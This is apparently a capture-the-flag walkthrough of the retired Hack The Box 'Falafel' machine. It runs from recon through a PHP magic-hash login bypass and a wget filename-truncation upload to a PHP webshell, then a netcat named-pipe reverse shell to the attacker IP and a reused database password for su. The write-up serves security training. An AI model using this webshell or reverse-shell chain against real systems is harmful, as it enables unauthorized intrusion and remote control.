@@ -1,0 +1,497 @@
+1:"$Sreact.fragment"
+2:I[4236,[],""]
+3:I[170,[],""]
+5:I[6025,[],"OutletBoundary"]
+6:"$Sreact.suspense"
+9:I[6025,[],"ViewportBoundary"]
+b:I[6025,[],"MetadataBoundary"]
+d:I[4168,[],"default",1]
+:HL["/_next/static/css/d6e294cd2610ae11.css","style"]
+0:{"P":null,"c":["","writing","hackthebox-falafel-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-falafel-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/d6e294cd2610ae11.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":404}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"Person\",\"@id\":\"https://cyberkareem.com/#person\",\"name\":\"Abdullah Kareem\",\"alternateName\":\"CyberKareem\",\"url\":\"https://cyberkareem.com\",\"jobTitle\":\"Security Researcher and Penetration Tester\",\"knowsAbout\":[\"Vulnerability research\",\"Penetration testing\",\"Responsible disclosure\",\"Web application security\",\"API security\",\"Mobile application security\",\"Infrastructure security\",\"Active Directory security\",\"Wireless security\",\"Application security consulting\"],\"sameAs\":[\"https://www.linkedin.com/in/cyberkareem/\",\"https://github.com/CyberKareem\",\"https://x.com/cyberkareem\",\"https://linktr.ee/cyberkareem\",\"https://app.hackthebox.com/public/users/349278\",\"https://www.credential.net/profile/cyberkareem/wallet\",\"https://www.credly.com/users/cyberkareem/badges\"]},{\"@type\":\"WebSite\",\"@id\":\"https://cyberkareem.com/#website\",\"url\":\"https://cyberkareem.com\",\"name\":\"CyberKareem — Abdullah Kareem\",\"publisher\":{\"@id\":\"https://cyberkareem.com/#person\"}}]}"}}]]}]}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":["$L4",null,["$","$L5",null,{"children":["$","$6",null,{"name":"Next.MetadataOutlet","children":"$@7"}]}]]}],{},null,false,null]},null,false,"$@8"]},null,false,"$@8"]},null,false,null],["$","$1","h",{"children":[null,["$","$L9",null,{"children":"$La"}],["$","div",null,{"hidden":true,"children":["$","$Lb",null,{"children":["$","$6",null,{"name":"Next.Metadata","children":"$Lc"}]}]}],null]}],false]],"m":"$undefined","G":["$d",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"65jXSdzueZKnFbMeYrtpi"}
+e:[]
+8:"$We"
+f:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+10:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+:HL["/writing/covers/hackthebox-falafel-walkthrough.webp","image"]
+4:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$Lf",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","a","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","a","/about",{"href":"/about","aria-current":"$undefined","children":"About"}]]}],["$","$Lf",null,{"className":"utility-link","href":"/contact#assessment-enquiries","aria-current":"$undefined","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L10",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$Lf",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Falafel Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Falafel machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T15:16:55.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[16," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-falafel-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Falafel machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Falafel machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/falafel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/1e33a051efd110570ea1dda27f465f991b082c9a/HTB-Falafel.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 1e33a051efd1",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Falafel"," · Linux"," · Hard"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/falafel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L11"]}]]}],["$L12","$L13","$L14"]]}],"$L15"]}]]}],"$L16"]}],"$L17","$L18"]
+11:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+12:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Falafel machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+13:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+14:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"11 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+19:T7cd8,
+<p><strong>Target IP:</strong> <code>10.129.229.139</code><br /><strong>Attacker IP:</strong> <code>10.10.16.84</code><br /><strong>OS:</strong> Linux (Ubuntu)<br /><strong>Difficulty:</strong> Hard<br /><strong>Flags:</strong></p>
+<ul>
+<li>User: <code>1e909[redacted]5bf217a</code></li>
+<li>Root: <code>cc38a05[redacted]b3341cd5</code></li>
+</ul>
+<hr />
+
+
+
+<h2 id="phase-0-the-hacker-mindset-before-starting">Phase 0: The Hacker Mindset Before Starting</h2>
+<h3 id="what-is-the-hacker-mindset">What is the "Hacker Mindset"?</h3>
+<p>Before typing a single command, understand this: <strong>hacking is not about running tools. It is about understanding how systems fail.</strong> Every machine on Hack The Box is a puzzle built by a human. Humans make assumptions. Humans take shortcuts. Humans reuse code patterns they learned from tutorials. Your job is to find those assumptions, shortcuts, and patterns — and exploit the gaps between what the developer <em>intended</em> and what the system <em>actually does</em>.</p>
+<h3 id="the-falafel-mindset">The Falafel Mindset</h3>
+<p>Falafel is a <strong>hard</strong> Linux box. That means:</p>
+<ul>
+<li>There will be <strong>multiple steps</strong> — no single exploit gives you root.</li>
+<li>There will be <strong>technical depth</strong> — you need to understand <em>why</em> things work, not just <em>that</em> they work.</li>
+<li>There will be <strong>misdirection</strong> — some paths look promising but are dead ends (like trying to crack the admin hash).</li>
+<li>The box rewards <strong>patience and curiosity</strong> — every file, every error message, every group membership is a potential clue.</li>
+</ul>
+<p><strong>Golden Rule for Falafel:</strong> Read everything. The box gives you hints constantly. The <code>cyberlaw.txt</code> file literally tells you the entire exploitation path. The admin's profile quote hints at type juggling. The upload error messages hint at filename length limits. The group memberships are not random — they are deliberately chosen to create a privilege escalation chain.</p>
+<hr />
+<h2 id="phase-1-reconnaissance-mapping-the-attack-surface">Phase 1: Reconnaissance - Mapping the Attack Surface</h2>
+<h3 id="the-command">The Command</h3>
+<pre><code class="language-bash" data-language="bash">nmap -sS -sC -sV -p- 10.129.229.139
+</code></pre>
+<h3 id="breaking-it-down-baby-steps">Breaking It Down (Baby Steps)</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Meaning</th>
+<th>Why We Use It</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-sS</code></td>
+<td>SYN scan (half-open)</td>
+<td>Fast and stealthy; does not complete the TCP handshake, leaving fewer logs</td>
+</tr>
+<tr>
+<td><code>-sC</code></td>
+<td>Run default NSE scripts</td>
+<td>Automatically checks for common misconfigurations (e.g., default Apache pages, SSH banner grabbing)</td>
+</tr>
+<tr>
+<td><code>-sV</code></td>
+<td>Version detection</td>
+<td>Tells us <em>exactly</em> which software is running, so we can look up known vulnerabilities</td>
+</tr>
+<tr>
+<td><code>-p-</code></td>
+<td>Scan all 65,535 ports</td>
+<td>Services often run on non-standard ports. Missing one open port could mean missing the entire attack vector</td>
+</tr>
+</tbody></table>
+<h3 id="the-results">The Results</h3>
+<pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+</code></pre>
+<h3 id="hacker-mindset-what-are-we-looking-for">Hacker Mindset: What Are We Looking For?</h3>
+<p><strong>Two services.</strong> That's it. This immediately tells us something important: <strong>the web application is the primary attack vector.</strong> SSH is almost certainly for later — either for credential reuse after we find passwords, or for a more stable shell once we have credentials.</p>
+<p><strong>Why does this matter?</strong> Because on a hard box with only two ports, the web app is where 90% of the work happens. We don't waste time looking for exotic kernel exploits or hidden services. We focus our energy on the HTTP service.</p>
+<p><strong>Additional Recon:</strong></p>
+<pre><code class="language-bash" data-language="bash">nmap -sC -sV -p 80,22 -oA nmap/scripts 10.129.229.139
+</code></pre>
+<p>This saves output in multiple formats (<code>-oA</code>) for documentation and future reference. Professional hackers document everything — you never know when you'll need to come back to a box.</p>
+<hr />
+<h2 id="phase-2-web-enumeration-reading-the-signs">Phase 2: Web Enumeration - Reading the Signs</h2>
+<h3 id="step-2a-visit-the-website">Step 2A: Visit the Website</h3>
+<p>Open <code>http://10.129.229.139</code> in a browser. What do you see?</p>
+<ul>
+<li>A simple site called "Falafel Lovers"</li>
+<li>A "Home" link and a "Login" button</li>
+<li>The login link goes to <code>login.php</code></li>
+</ul>
+<p><strong>Hacker Mindset:</strong> The <code>.php</code> extension tells us the backend is PHP. This is critical because PHP has specific vulnerability classes (type juggling, file inclusion, unsafe serialization) that Python or Node.js apps don't have.</p>
+<h3 id="step-2b-check-robots-txt">Step 2B: Check robots.txt</h3>
+<pre><code class="language-bash" data-language="bash">curl http://10.129.229.139/robots.txt
+</code></pre>
+<p>Result:</p>
+<pre><code>/*.txt
+</code></pre>
+<p><strong>Hacker Mindset:</strong> <code>robots.txt</code> is not a security control — it is an <em>invitation</em>. The developer is saying "please don't look at .txt files." A hacker's immediate response is: <strong>I am absolutely going to look at .txt files.</strong> This is like a sign that says "Do not enter" on an unlocked door.</p>
+<h3 id="step-2c-directory-brute-forcing">Step 2C: Directory Brute-Forcing</h3>
+<pre><code class="language-bash" data-language="bash">ffuf -u http://10.129.229.139/FUZZ -ic -e .txt,.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre>
+<p><strong>Why these extensions?</strong></p>
+<ul>
+<li><code>.php</code> — we know it's a PHP app</li>
+<li><code>.txt</code> — robots.txt explicitly mentioned .txt files</li>
+</ul>
+<p><strong>Key findings:</strong></p>
+<table>
+<thead>
+<tr>
+<th>File/Dir</th>
+<th>Status</th>
+<th>Why It Matters</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>login.php</code></td>
+<td>200</td>
+<td>Authentication page — primary target</td>
+</tr>
+<tr>
+<td><code>upload.php</code></td>
+<td>302</td>
+<td>Requires login — our end goal after auth bypass</td>
+</tr>
+<tr>
+<td><code>profile.php</code></td>
+<td>302</td>
+<td>Requires login — likely post-auth functionality</td>
+</tr>
+<tr>
+<td><code>cyberlaw.txt</code></td>
+<td>200</td>
+<td><strong>THE ROADMAP</strong> — read this immediately</td>
+</tr>
+<tr>
+<td><code>connection.php</code></td>
+<td>200</td>
+<td>Empty response, but name suggests DB credentials</td>
+</tr>
+</tbody></table>
+<h3 id="step-2d-read-cyberlaw-txt">Step 2D: Read cyberlaw.txt</h3>
+<pre><code class="language-bash" data-language="bash">curl http://10.129.229.139/cyberlaw.txt
+</code></pre>
+<p>Result:</p>
+<pre><code>From: Falafel Network Admin (admin@falafel.htb)
+Subject: URGENT!! MALICIOUS SITE TAKE OVER!
+...
+A user named "chris" has informed me that he could log into MY account
+without knowing the password, then take FULL CONTROL of the website using
+the image upload feature.
+...
+Dear develpors, fix this broken site ASAP.
+</code></pre>
+<p><strong>Hacker Mindset: This is the most important file on the entire box.</strong></p>
+<p>Let's break down what the developer just told us:</p>
+<ol>
+<li><strong>"chris"</strong> is a valid username.</li>
+<li><strong>"log into MY account without knowing the password"</strong> — the authentication mechanism is broken. There is a bypass.</li>
+<li><strong>"image upload feature"</strong> — there's a file upload that leads to code execution.</li>
+<li><strong>"senior php developer worked on filtering the URL of the upload"</strong> — the upload has <em>some</em> protection, but it's not perfect. The developer is overconfident.</li>
+<li><strong>"Dear develpors"</strong> [sic] — the typo is funny, but more importantly, this reinforces that we're dealing with a PHP application written by someone who thinks they've fixed the vulnerabilities.</li>
+</ol>
+<p><strong>This one file tells us the entire exploitation chain:</strong> bypass login → upload shell → code execution. Our job is now to figure out the <em>mechanics</em> of each step.</p>
+<hr />
+<h2 id="phase-3-authentication-recon-finding-the-cracks">Phase 3: Authentication Recon - Finding the Cracks</h2>
+<h3 id="step-3a-test-the-login-form-manually">Step 3A: Test the Login Form Manually</h3>
+<p>Visit <code>http://10.129.229.139/login.php</code>. Try logging in with:</p>
+<ul>
+<li>Username: <code>admin</code>, Password: null</li>
+<li>Username: <code>nonexistent</code>, Password: null</li>
+</ul>
+<p><strong>Observe the error messages:</strong></p>
+<ul>
+<li>Non-existent user: <code>"Try again"</code></li>
+<li>Existing user, wrong password: null</li>
+</ul>
+<p><strong>Hacker Mindset: This is an information disclosure vulnerability.</strong> The application tells us whether a username exists <em>before</em> checking the password. This means:</p>
+<ol>
+<li>We can enumerate valid usernames.</li>
+<li>The backend likely runs a query like <code>SELECT * FROM users WHERE username = '$input'</code> first.</li>
+<li>If the username exists, it <em>then</em> checks the password.</li>
+</ol>
+<p>This two-step process is a classic pattern — and a classic mistake. It gives us binary feedback (username exists / doesn't exist), which is the foundation for blind SQL injection attacks.</p>
+<h3 id="step-3b-username-enumeration-with-wfuzz">Step 3B: Username Enumeration with wfuzz</h3>
+<pre><code class="language-bash" data-language="bash">wfuzz -c -w [redacted encoded lab material].txt \
+  -d "username=FUZZ&amp;password=REDACTED \
+  -u http://10.129.229.139/login.php --hh 7074
+</code></pre>
+<p><strong>What does this do?</strong></p>
+<ul>
+<li><code>-c</code> = colored output (easier to read)</li>
+<li><code>-w</code> = wordlist (list of common names)</li>
+<li><code>-d</code> = POST data. <code>FUZZ</code> is replaced by each wordlist entry</li>
+<li><code>--hh 7074</code> = hide responses with 7074 characters (the "Try again" response for invalid users)</li>
+</ul>
+<p><strong>Results:</strong></p>
+<pre><code>admin   (response size different)
+chris   (response size different)
+</code></pre>
+<p><strong>Hacker Mindset:</strong> We now know two valid accounts: <code>admin</code> and <code>chris</code>. We also know the application responds differently based on username validity. This confirms our hypothesis about the two-step authentication process.</p>
+<p><strong>Why does this matter?</strong> Because if the app checks username first, we can inject SQL into the username field and use the password error message as a "true/false" oracle. This is called <strong>boolean-based blind SQL injection</strong>.</p>
+<hr />
+<h2 id="phase-4-php-type-juggling-the-magic-hash-attack">Phase 4: PHP Type Juggling - The Magic Hash Attack</h2>
+<h3 id="understanding-the-vulnerability">Understanding the Vulnerability</h3>
+<p>PHP has a feature called <strong>type juggling</strong>. When you use a loose comparison operator (<code>==</code>), PHP tries to automatically convert variables to compatible types before comparing them. This is different from strict comparison (<code>===</code>), which checks both value <em>and</em> type.</p>
+<p><strong>Example:</strong></p>
+<pre><code class="language-php" data-language="php">var_dump("0e123456" == "0e987654");  // bool(true)
+var_dump("0e123456" === "0e987654"); // bool(false)
+</code></pre>
+<p><strong>Why is the first one true?</strong>
+PHP sees strings that start with <code>0e</code> followed by digits. It interprets these as <strong>scientific notation</strong> (0 × 10^anything = 0). Both sides evaluate to the float <code>0.0</code>, so <code>0.0 == 0.0</code> is <code>true</code>.</p>
+<h3 id="how-does-this-apply-to-password-hashing">How Does This Apply to Password Hashing?</h3>
+<p>Many PHP applications store MD5 password hashes and compare them like this:</p>
+<pre><code class="language-php" data-language="php">if ($stored_hash == md5($user_password)) {
+    login_successful();
+}
+</code></pre>
+<p><strong>The attack:</strong> If the stored hash starts with <code>0e</code> followed by only digits, it is a <strong>magic hash</strong>. If we can find <em>any</em> password whose MD5 hash also starts with <code>0e...</code>, the loose comparison will evaluate to <code>true</code>.</p>
+<h3 id="the-magic-hash-for-md5">The Magic Hash for MD5</h3>
+<table>
+<thead>
+<tr>
+<th>Input</th>
+<th>MD5 Hash</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>240610708</code></td>
+<td><code>[redacted retired-lab hash or flag]</code></td>
+</tr>
+</tbody></table>
+<p>Any hash starting with <code>0e</code> and containing only digits after it will be interpreted as <code>0.0</code> in PHP.</p>
+<h3 id="step-4a-test-the-magic-hash-login">Step 4A: Test the Magic Hash Login</h3>
+<pre><code class="language-bash" data-language="bash">curl -s -X POST -d "username=admin&amp;password=REDACTED \
+  -c cookies.txt http://10.129.229.139/login.php | grep -i "upload"
+</code></pre>
+<p><strong>Result:</strong> We see links to <code>upload.php</code>, <code>profile.php</code>, and <code>logout.php</code>. <strong>We are authenticated as admin.</strong></p>
+<p><strong>Hacker Mindset: We bypassed authentication without knowing the real password.</strong> We didn't brute-force it, we didn't SQL inject it (though that was possible too), and we didn't need to crack any hash. We exploited the developer's misunderstanding of PHP's type system.</p>
+<p><strong>Why is this so powerful?</strong> Because the developer probably thought they were safe. They stored hashed passwords. They didn't store plaintext. But they used <code>==</code> instead of <code>===</code>, and that single-character difference (<code>=</code> vs <code>===</code>) completely broke their authentication.</p>
+<hr />
+<h2 id="phase-5-file-upload-exploitation-filename-truncation">Phase 5: File Upload Exploitation - Filename Truncation</h2>
+<h3 id="understanding-the-upload-mechanism">Understanding the Upload Mechanism</h3>
+<p>Visit <code>http://10.129.229.139/upload.php</code>. The page allows you to submit a URL to an image. The server downloads it using <code>wget</code>.</p>
+<p><strong>Attempt 1:</strong> Try uploading a direct PHP shell (<code>shell.php</code>).
+<strong>Result:</strong> "Extension not allowed" or similar error.</p>
+<p><strong>Attempt 2:</strong> Try uploading <code>shell.php.png</code>.
+<strong>Result:</strong> The server downloads it... but it's saved as <code>.php.png</code> and doesn't execute as PHP.</p>
+<p><strong>Hacker Mindset: The developer applied a filter. Filters can always be bypassed if you understand the underlying mechanism.</strong></p>
+<h3 id="the-wget-filename-limit">The Wget Filename Limit</h3>
+<p><code>wget</code> has a built-in filename length limit of <strong>236 characters</strong>. If a URL's filename is longer than 236 characters, <code>wget</code> truncates it.</p>
+<p><strong>The critical insight:</strong> The extension filter runs <em>before</em> <code>wget</code> saves the file. So:</p>
+<ol>
+<li>Filter sees <code>longname.php.png</code> → allows it (<code>.png</code> is valid)</li>
+<li><code>wget</code> downloads the file</li>
+<li><code>wget</code> truncates the filename to 236 chars</li>
+<li>The <code>.png</code> part gets cut off</li>
+<li>The file is now saved as <code>longname.php</code></li>
+</ol>
+<h3 id="step-5a-create-the-webshell">Step 5A: Create the Webshell</h3>
+<pre><code class="language-bash" data-language="bash">cd /tmp
+echo '&lt;?php system($_REQUEST["cmd"]); ?&gt;' &gt; $(python3 -c 'print("A"*232 + ".php.png")')
+</code></pre>
+<p><strong>Why 232 A's?</strong></p>
+<ul>
+<li>The full URL is: <code>http://10.10.16.84:8081/</code> (24 chars) + <code>A*232</code> (232 chars) + <code>.php.png</code> (8 chars) = 264 chars total</li>
+<li>But <code>wget</code> counts only the filename part, and the truncation point is carefully chosen so that <code>.png</code> falls beyond the 236-character limit for the filename portion</li>
+<li>The math: we want the final saved name to be <code>A*232.php</code> (236 chars total), so the <code>.png</code> gets truncated</li>
+</ul>
+<h3 id="step-5b-start-a-local-web-server">Step 5B: Start a Local Web Server</h3>
+<pre><code class="language-bash" data-language="bash">cd /tmp &amp;&amp; python3 -m http.server 8081
+</code></pre>
+<p><strong>Why?</strong> The target server fetches the file from our machine. We need to host it.</p>
+<h3 id="step-5c-submit-the-upload">Step 5C: Submit the Upload</h3>
+<pre><code class="language-bash" data-language="bash">cd /tmp
+FILENAME=$(python3 -c 'print("A"*232 + ".php.png")')
+curl -s -b cookies.txt -X POST \
+  -d "url=http://10.10.16.84:8081/$FILENAME" \
+  http://10.129.229.139/upload.php | grep -E "CMD|New name|uploads/"
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>CMD: cd /var/www/html/uploads/0531-1954_30d7e3e4cc82c58e; wget 'http://10.10.16.84:8081/AAAA...AAAA.php.png'
+New name is AAAAAAAAA...AAAAAAAA.php.
+</code></pre>
+<p><strong>Notice the dot at the end!</strong> The <code>.png</code> was truncated. The file is now <code>.php.</code> (the trailing dot is just how the output formats it).</p>
+<p><strong>Hacker Mindset: We defeated two protections at once.</strong></p>
+<ol>
+<li>The extension filter (saw <code>.png</code>, allowed it)</li>
+<li>The filename save mechanism (<code>wget</code> truncated the name, leaving <code>.php</code>)</li>
+</ol>
+<p>This is a classic example of <strong>intersection of behaviors</strong> — two systems (the upload filter and wget) have different ideas of what the filename is, and that discrepancy creates a vulnerability.</p>
+<hr />
+<h2 id="phase-6-initial-access-catching-a-shell">Phase 6: Initial Access - Catching a Shell</h2>
+<h3 id="step-6a-test-code-execution">Step 6A: Test Code Execution</h3>
+<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.229.139/uploads/0531-1954_30d7e3e4cc82c58e/AAAAAAAA...AAAAAAAA.php?cmd=id"
+</code></pre>
+<p><strong>Result:</strong> <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>
+<h3 id="step-6b-upgrade-to-reverse-shell">Step 6B: Upgrade to Reverse Shell</h3>
+<p>A webshell is fine for single commands, but we want an interactive shell for exploring the system, running <code>su</code>, and generally having a better time.</p>
+<p><strong>Start a listener on Kali:</strong></p>
+<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
+</code></pre>
+<p><strong>Trigger the reverse shell:</strong></p>
+<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.229.139/uploads/0531-1954_30d7e3e4cc82c58e/AAAAAAAA...AAAAAAAA.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.84%204444%20%3E%2Ftmp%2Ff"
+</code></pre>
+<p><strong>Decoded payload:</strong></p>
+<pre><code class="language-bash" data-language="bash">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.16.84 4444 &gt; /tmp/f
+</code></pre>
+<p><strong>How this works:</strong></p>
+<ol>
+<li><code>mkfifo /tmp/f</code> creates a named pipe (FIFO)</li>
+<li><code>cat /tmp/f</code> reads from the pipe</li>
+<li>The output goes to <code>/bin/sh -i</code> (interactive shell)</li>
+<li>The shell's output goes through <code>nc</code> back to our listener</li>
+<li><code>nc</code>'s output goes back into the pipe (<code>&gt; /tmp/f</code>)</li>
+<li>This creates a full duplex communication channel</li>
+</ol>
+<p><strong>Result on Kali:</strong></p>
+<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.229.139] 45290
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p><strong>Hacker Mindset:</strong> We now have a shell as <code>www-data</code>. This is the web server user — heavily restricted, but we can read web files, configuration files, and anything the web server has access to. Our next goal is to find credentials or misconfigurations that let us become a real user.</p>
+<hr />
+<h2 id="phase-7-privilege-escalation-to-moshe-credential-reuse">Phase 7: Privilege Escalation to Moshe - Credential Reuse</h2>
+<h3 id="step-7a-read-web-application-files">Step 7A: Read Web Application Files</h3>
+<pre><code class="language-bash" data-language="bash">cat /var/www/html/connection.php
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code class="language-php" data-language="php">&lt;?php
+   define('DB_SERVER', 'localhost:3306');
+   define('DB_USERNAME', 'moshe');
+   define('DB_PASSWORD', 'falafelIsReallyTasty');
+   define('DB_DATABASE', 'falafel');
+?&gt;
+</code></pre>
+<p><strong>Hacker Mindset: Developers reuse passwords.</strong> It is extremely common for database passwords to be the same as the system user's password. Why? Because humans are lazy, and remembering 47 different passwords is hard. The developer created a user <code>moshe</code> for the database and probably used the same password for the system account.</p>
+<h3 id="step-7b-upgrade-the-shell">Step 7B: Upgrade the Shell</h3>
+<p>Basic <code>nc</code> shells are "dumb" — they don't handle TTY properly, so <code>su</code> won't work directly.</p>
+<pre><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre>
+<p>This gives us a pseudo-terminal, making the shell behave more like a real SSH session.</p>
+<h3 id="step-7c-become-moshe">Step 7C: Become Moshe</h3>
+<pre><code class="language-bash" data-language="bash">su moshe
+</code></pre>
+<p>Password: null</p>
+<p><strong>Result:</strong></p>
+<pre><code>moshe@falafel:/var/www/html/uploads/0531-1954_30d7e3e4cc82c58e$ id
+uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
+</code></pre>
